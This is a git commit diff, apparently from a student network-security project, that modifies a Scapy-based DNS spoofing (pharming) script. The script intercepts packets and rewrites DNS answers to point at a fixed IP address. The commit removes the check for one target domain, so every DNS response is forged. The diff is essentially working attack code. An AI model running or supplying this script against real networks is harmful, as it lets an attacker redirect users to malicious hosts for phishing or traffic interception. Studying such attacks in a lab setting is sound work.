377f3c0aaaca10fcb2c9e60d043474d50425c525
ohmybuggg <sa0963278610@gmail.com>
2021-04-23 15:24:04 +0800

    add DNSspoofing

--- project2/test_pharm.py
+++ project2/test_pharm.py
@@ -4,21 +4,22 @@ import scapy.all as scapy
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
+    print("[+] Get target package, determine if it has DNS request")
     if scapy_packet.haslayer(scapy.DNSRR):
         # print(scapy_packet.show())
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.nycu.edu" in qname:
-            print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname=qname, rdata="140.113.207.246")
-            scapy_packet[scapy.DNS].an = answer
-            scapy_packet[scapy.DNS].ancount = 1
+        # if "www.nycu.edu" in qname:
+        print("[+] Spoofing target")
+        answer = scapy.DNSRR(rrname=qname, rdata="140.113.207.246")
+        scapy_packet[scapy.DNS].an = answer
+        scapy_packet[scapy.DNS].ancount = 1
 
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].chksum
-            del scapy_packet[scapy.UDP].len
+        del scapy_packet[scapy.IP].len
+        del scapy_packet[scapy.IP].chksum
+        del scapy_packet[scapy.UDP].chksum
+        del scapy_packet[scapy.UDP].len
 
-            packet.set_payload(str(scapy_packet))
+        packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
 
